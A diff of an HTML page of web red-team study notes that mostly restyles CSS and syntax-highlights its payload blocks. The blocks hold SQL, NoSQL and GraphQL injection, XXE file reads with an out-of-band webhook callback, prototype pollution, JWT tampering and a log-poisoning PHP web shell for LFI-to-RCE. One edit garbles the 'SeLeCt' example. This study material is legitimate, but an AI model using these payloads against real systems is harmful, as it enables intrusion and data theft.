@@ -5,198 +5,241 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Web Red Team Analyst (WEB-RTA) Study Notes</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     
 <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Source+Serif+4:ital,opsz,wght@0,8..60,400;0,8..60,600;0,8..60,700;1,8..60,400&display=swap');
+
     :root {
-        --bg-primary: #0a0a0f;
-        --bg-secondary: #12121a;
-        --bg-code: #1a1a24;
-        --accent: #00ff88;
-        --accent-dim: #00cc6a;
-        --text: #e4e4e7;
-        --text-dim: #a1a1aa;
-        --border: #27272a;
+        --bg-primary: #1A1915;
+        --bg-surface: #21201C;
+        --bg-elevated: #2A2924;
+        --bg-code: #252420;
+        --accent: #D4A27F;
+        --accent-hover: #E0B595;
+        --accent-dim: #B8896A;
+        --text-primary: #EDEDEC;
+        --text-secondary: #A8A8A4;
+        --text-muted: #706F6C;
+        --border: #3D3D37;
+        --border-subtle: #2E2E29;
     }
-    
+
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    
+
     body {
-        font-family: 'Segoe UI', system-ui, sans-serif;
+        font-family: 'Source Serif 4', 'Georgia', serif;
         background: var(--bg-primary);
-        color: var(--text);
+        color: var(--text-primary);
         line-height: 1.8;
-        padding: 40px 20px;
-        max-width: 900px;
+        padding: 48px 24px 80px;
+        max-width: 720px;
         margin: 0 auto;
+        font-size: 1.0625rem;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
     }
-    
+
     .back-link {
         display: inline-flex;
         align-items: center;
-        gap: 8px;
-        color: var(--accent);
+        gap: 6px;
+        color: var(--text-secondary);
         text-decoration: none;
-        font-size: 0.875rem;
-        margin-bottom: 32px;
-        padding: 8px 16px;
-        background: var(--bg-secondary);
-        border-radius: 8px;
-        border: 1px solid var(--border);
-        transition: all 0.3s;
+        font-family: 'Inter', sans-serif;
+        font-size: 0.8125rem;
+        font-weight: 500;
+        letter-spacing: 0.02em;
+        margin-bottom: 48px;
+        padding: 6px 0;
+        border-bottom: 1px solid transparent;
+        transition: color 0.2s, border-color 0.2s;
     }
-    
+
     .back-link:hover {
-        background: var(--bg-code);
-        border-color: var(--accent);
-    }
-    
-    h1 {
-        font-size: 2.5rem;
-        margin-bottom: 16px;
-        color: var(--text);
-        border-bottom: 2px solid var(--accent);
-        padding-bottom: 16px;
-    }
-    
-    h2 {
-        font-size: 1.75rem;
-        margin: 48px 0 16px;
-        color: var(--text);
-        display: flex;
-        align-items: center;
-        gap: 12px;
-    }
-    
-    h2::before {
-        content: '##';
         color: var(--accent);
-        font-family: monospace;
-        font-size: 1rem;
+        border-bottom-color: var(--accent);
     }
-    
+
+    h1 {
+        font-family: 'Inter', sans-serif;
+        font-size: 2.25rem;
+        font-weight: 700;
+        line-height: 1.2;
+        margin-bottom: 24px;
+        color: var(--text-primary);
+        letter-spacing: -0.025em;
+    }
+
+    h2 {
+        font-family: 'Inter', sans-serif;
+        font-size: 1.375rem;
+        font-weight: 600;
+        margin: 56px 0 16px;
+        color: var(--text-primary);
+        letter-spacing: -0.015em;
+        line-height: 1.3;
+        padding-bottom: 12px;
+        border-bottom: 1px solid var(--border-subtle);
+    }
+
     h3 {
-        font-size: 1.25rem;
-        margin: 32px 0 12px;
-        color: var(--text-dim);
+        font-family: 'Inter', sans-serif;
+        font-size: 1.125rem;
+        font-weight: 600;
+        margin: 40px 0 12px;
+        color: var(--text-primary);
+        letter-spacing: -0.01em;
     }
-    
-    p { margin-bottom: 16px; }
-    
+
+    h4 {
+        font-family: 'Inter', sans-serif;
+        font-size: 1rem;
+        font-weight: 600;
+        margin: 32px 0 8px;
+        color: var(--text-secondary);
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+        font-size: 0.8125rem;
+    }
+
+    p {
+        margin-bottom: 20px;
+        color: var(--text-primary);
+    }
+
     a {
         color: var(--accent);
         text-decoration: none;
-        border-bottom: 1px solid transparent;
-        transition: border-color 0.3s;
+        border-bottom: 1px solid var(--accent-dim);
+        transition: color 0.2s, border-color 0.2s;
     }
-    
-    a:hover { border-bottom-color: var(--accent); }
-    
+
+    a:hover {
+        color: var(--accent-hover);
+        border-bottom-color: var(--accent-hover);
+    }
+
+    strong { font-weight: 600; color: var(--text-primary); }
+
     img {
         max-width: 100%;
         height: auto;
-        border-radius: 12px;
-        margin: 24px 0;
+        border-radius: 8px;
+        margin: 32px 0;
         border: 1px solid var(--border);
-        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
     }
-    
+
     code {
-        font-family: 'JetBrains Mono', 'Fira Code', monospace;
+        font-family: 'JetBrains Mono', monospace;
         background: var(--bg-code);
-        padding: 2px 8px;
+        padding: 2px 6px;
         border-radius: 4px;
-        font-size: 0.9em;
+        font-size: 0.85em;
         color: var(--accent);
-        border: 1px solid var(--border);
+        border: 1px solid var(--border-subtle);
     }
-    
+
     pre {
-        background: var(--bg-secondary);
-        padding: 20px;
-        border-radius: 12px;
+        background: var(--bg-surface);
+        padding: 20px 24px;
+        border-radius: 8px;
         overflow-x: auto;
-        margin: 24px 0;
+        margin: 28px 0;
         border: 1px solid var(--border);
-        position: relative;
     }
-    
-    pre::before {
-        content: 'terminal';
-        position: absolute;
-        top: 8px;
-        right: 12px;
-        font-size: 0.75rem;
-        color: var(--text-dim);
-        text-transform: uppercase;
-        letter-spacing: 1px;
-    }
-    
+
     pre code {
         background: none;
         padding: 0;
         border: none;
-        color: var(--text);
+        color: var(--text-primary);
+        font-size: 0.8125rem;
+        line-height: 1.7;
     }
-    
+
     blockquote {
-        border-left: 3px solid var(--accent);
-        padding-left: 20px;
-        margin: 24px 0;
-        color: var(--text-dim);
+        border-left: 2px solid var(--accent-dim);
+        padding: 4px 0 4px 24px;
+        margin: 28px 0;
+        color: var(--text-secondary);
         font-style: italic;
     }
-    
+
+    blockquote p { margin-bottom: 8px; }
+
     ul, ol {
-        margin: 16px 0 16px 24px;
+        margin: 16px 0 20px 20px;
     }
-    
+
     li {
         margin-bottom: 8px;
+        padding-left: 4px;
     }
-    
+
+    li::marker {
+        color: var(--text-muted);
+    }
+
     table {
         width: 100%;
         border-collapse: collapse;
-        margin: 24px 0;
+        margin: 28px 0;
+        font-family: 'Inter', sans-serif;
+        font-size: 0.875rem;
     }
-    
+
     th, td {
         padding: 12px 16px;
         text-align: left;
-        border: 1px solid var(--border);
+        border-bottom: 1px solid var(--border-subtle);
     }
-    
+
     th {
-        background: var(--bg-secondary);
-        color: var(--accent);
         font-weight: 600;
+        color: var(--text-secondary);
+        font-size: 0.75rem;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        border-bottom: 1px solid var(--border);
     }
-    
-    tr:nth-child(even) { background: var(--bg-secondary); }
-    
+
+    tr:hover td { background: var(--bg-surface); }
+
     hr {
         border: none;
         height: 1px;
-        background: var(--border);
-        margin: 40px 0;
+        background: var(--border-subtle);
+        margin: 48px 0;
     }
-    
+
     .meta {
         display: flex;
-        gap: 24px;
-        margin-bottom: 32px;
-        padding: 16px;
-        background: var(--bg-secondary);
-        border-radius: 8px;
-        font-size: 0.875rem;
-        color: var(--text-dim);
+        gap: 20px;
+        margin-bottom: 40px;
+        padding-bottom: 24px;
+        border-bottom: 1px solid var(--border-subtle);
+        font-family: 'Inter', sans-serif;
+        font-size: 0.8125rem;
+        color: var(--text-muted);
     }
-    
+
     .meta-item {
         display: flex;
         align-items: center;
         gap: 6px;
+    }
+
+    ::selection {
+        background: rgba(212, 162, 127, 0.25);
+        color: var(--text-primary);
+    }
+
+    @media (max-width: 640px) {
+        body { padding: 32px 16px 60px; font-size: 1rem; }
+        h1 { font-size: 1.75rem; }
+        h2 { font-size: 1.25rem; margin-top: 40px; }
+        pre { padding: 16px; margin: 20px -16px; border-radius: 0; border-left: 0; border-right: 0; }
     }
 </style>
 
@@ -204,7 +247,7 @@
 <body>
     <a href="../index.html" class="back-link">← Back to Index</a>
     <div class="meta">
-        <span class="meta-item">📅 Updated: 2025-12-30</span>
+        <span class="meta-item">📅 Updated: 2026-02-01</span>
         <span class="meta-item">📂 CheatSheets</span>
     </div>
     <article>
@@ -398,7 +441,7 @@ intitle:"Index of" inurl:/backup/ "admin.zip"
 </tr>
 <tr>
   <td>Case Changing</td>
-  <td><code>&lt;ScRiPt&gt;</code>, <code>SeLeCt</code>, <code>UniOn</code></td>
+  <td><code>&lt;ScRiPt&gt;</code>, <code>SeLeCt&gt;</code>, <code>UniOn</code></td>
 </tr>
 <tr>
   <td>Content-Type Manipulation</td>
@@ -453,31 +496,35 @@ intitle:"Index of" inurl:/backup/ "admin.zip"
 
 <h3>SQLi Payloads</h3>
 
-<pre><code>// Auth Bypass
-{"username": "admin' --", "password": "anything"}
+<div class="codehilite">
+<pre><span></span><code><span class="c1">// Auth Bypass</span>
+<span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&#39; --&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;anything&quot;</span><span class="p">}</span>
 
-// Column Enumeration
-{"username": "admin' OR 1=1 ORDER BY 100--", "password": "anything"}
+<span class="c1">// Column Enumeration</span>
+<span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&#39; OR 1=1 ORDER BY 100--&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;anything&quot;</span><span class="p">}</span>
 
-// Union - Column Count (increment NULLs)
-{"username": "admin' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "password": "anything"}
+<span class="c1">// Union - Column Count (increment NULLs)</span>
+<span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&#39; UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;anything&quot;</span><span class="p">}</span>
 
-// Time-Based (PostgreSQL)
-{"username": "admin' OR 1=1; SELECT pg_sleep(5)--", "password": "anything"}
+<span class="c1">// Time-Based (PostgreSQL)</span>
+<span class="p">{</span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&#39; OR 1=1; SELECT pg_sleep(5)--&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;password&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;anything&quot;</span><span class="p">}</span>
 </code></pre>
+</div>
 
 <h3>XXE (XML External Entity)</h3>
 
-<pre><code>&lt;!-- Classic XXE - File Read --&gt;
-&lt;?xml version="1.0"?&gt;
-&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
-&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;
+<div class="codehilite">
+<pre><span></span><code><span class="cm">&lt;!-- Classic XXE - File Read --&gt;</span>
+<span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span>]&gt;
+<span class="nt">&lt;user&gt;&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;&lt;/user&gt;</span>
 
-&lt;!-- Blind XXE (OOB) --&gt;
-&lt;?xml version="1.0"?&gt;
-&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "https://webhook.site/&lt;UUID&gt;"&gt;]&gt;
-&lt;user&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/user&gt;
+<span class="cm">&lt;!-- Blind XXE (OOB) --&gt;</span>
+<span class="cp">&lt;?xml version=&quot;1.0&quot;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;https://webhook.site/&lt;UUID&gt;</span>&quot;&gt;]&gt;
+<span class="nt">&lt;user&gt;&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;&lt;/user&gt;</span>
 </code></pre>
+</div>
 
 <h3>SSTI (Server-Side Template Injection)</h3>
 
@@ -493,27 +540,31 @@ intitle:"Index of" inurl:/backup/ "admin.zip"
 
 <h3>NoSQL Injection</h3>
 
-<pre><code>// Boolean-Based
-{ "owner": { "$ne": "" } }
+<div class="codehilite">
+<pre><span></span><code><span class="c1">// Boolean-Based</span>
+<span class="p">{</span><span class="w"> </span><span class="nt">&quot;owner&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
 
-// Regex Wildcard
-{ "owner": { "$regex": ".*" } }
+<span class="c1">// Regex Wildcard</span>
+<span class="p">{</span><span class="w"> </span><span class="nt">&quot;owner&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;$regex&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;.*&quot;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
 
-// OR-Based
-{ "$or": [{ "owner": "admin" }, { "owner": { "$ne": "admin" } }] }
+<span class="c1">// OR-Based</span>
+<span class="p">{</span><span class="w"> </span><span class="nt">&quot;$or&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span><span class="w"> </span><span class="nt">&quot;owner&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;owner&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;$ne&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}]</span><span class="w"> </span><span class="p">}</span>
 
-// Error-Based
-{ "owner": { "$abcd": "123" } }
+<span class="c1">// Error-Based</span>
+<span class="p">{</span><span class="w"> </span><span class="nt">&quot;owner&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;$abcd&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;123&quot;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">}</span>
 </code></pre>
+</div>
 
 <h3>GraphQL Injection</h3>
 
-<pre><code>// Error-Based
-{"query":"{ user(username:\"qwe'\") { id username balance } }"}
+<div class="codehilite">
+<pre><span></span><code><span class="c1">// Error-Based</span>
+<span class="p">{</span><span class="nt">&quot;query&quot;</span><span class="p">:</span><span class="s2">&quot;{ user(username:\&quot;qwe&#39;\&quot;) { id username balance } }&quot;</span><span class="p">}</span>
 
-// Introspection
-{"query":"{ __schema { types { name fields { name } } } }"}
+<span class="c1">// Introspection</span>
+<span class="p">{</span><span class="nt">&quot;query&quot;</span><span class="p">:</span><span class="s2">&quot;{ __schema { types { name fields { name } } } }&quot;</span><span class="p">}</span>
 </code></pre>
+</div>
 
 <h3>Command Injection</h3>
 
@@ -664,9 +715,11 @@ php://filter/convert.base64-encode/resource=index.php
 
 <h3>Prototype Pollution</h3>
 
-<pre><code>{"__proto__": {"isAdmin": true}}
-{"constructor": {"prototype": {"admin": true}}}
+<div class="codehilite">
+<pre><span></span><code><span class="p">{</span><span class="nt">&quot;__proto__&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;isAdmin&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}}</span>
+<span class="p">{</span><span class="nt">&quot;constructor&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;prototype&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;admin&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}}}</span>
 </code></pre>
+</div>
 
 <h3>File Upload Bypass</h3>
 
@@ -732,8 +785,10 @@ php://filter/convert.base64-encode/resource=index.php
 
 <p>Modify JWT <code>kid</code> header to attacker URL:</p>
 
-<pre><code>{"alg": "HS256", "typ": "JWT", "kid": "http://internal-server/admin"}
+<div class="codehilite">
+<pre><span></span><code><span class="p">{</span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HS256&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;http://internal-server/admin&quot;</span><span class="p">}</span>
 </code></pre>
+</div>
 
 <h3>Chain 4: Broken Session → SSTI → RCE</h3>
 
@@ -827,15 +882,17 @@ scope=read → scope=admin
 
 <h3>LFI → RCE Lab</h3>
 
-<pre><code># 1. Confirm LFI
-http://target/index.php?search=..%2F..%2F..%2Fetc%2Fpasswd
+<div class="codehilite">
+<pre><span></span><code><span class="c1"># 1. Confirm LFI</span>
+http://target/index.php?search<span class="o">=</span>..%2F..%2F..%2Fetc%2Fpasswd
 
-# 2. Poison logs
-curl -A "&lt;?php system(\$_GET['cmd']); ?&gt;" http://target/
+<span class="c1"># 2. Poison logs</span>
+curl<span class="w"> </span>-A<span class="w"> </span><span class="s2">&quot;&lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="w"> </span>http://target/
 
-# 3. Trigger RCE
-http://target/index.php?search=logs%2Faccess.log&amp;cmd=id
+<span class="c1"># 3. Trigger RCE</span>
+http://target/index.php?search<span class="o">=</span>logs%2Faccess.log<span class="p">&amp;</span><span class="nv">cmd</span><span class="o">=</span>id
 </code></pre>
+</div>
 
     </article>
 </body>
